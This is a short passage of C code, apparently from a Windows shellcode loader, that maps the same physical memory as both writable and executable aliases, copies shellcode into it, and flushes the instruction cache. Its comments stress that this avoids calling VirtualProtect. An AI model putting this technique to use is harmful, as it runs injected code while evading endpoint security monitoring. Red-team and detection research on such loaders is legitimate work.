    printf("[+] RW alias: %p\\n", rwAlias);
    printf("[+] RX alias: %p\\n", rxAlias);
    printf("[+] Same physical pages — no VirtualProtect needed\\n");

    // Write shellcode via RW alias (no permission change — page is already RW)
    memcpy(rwAlias, shellcode, scLen);
    FlushInstructionCache(GetCurrentProcess(), rxAlias, scLen);

    // Unmap RW alias (optional — reduces attack surface)
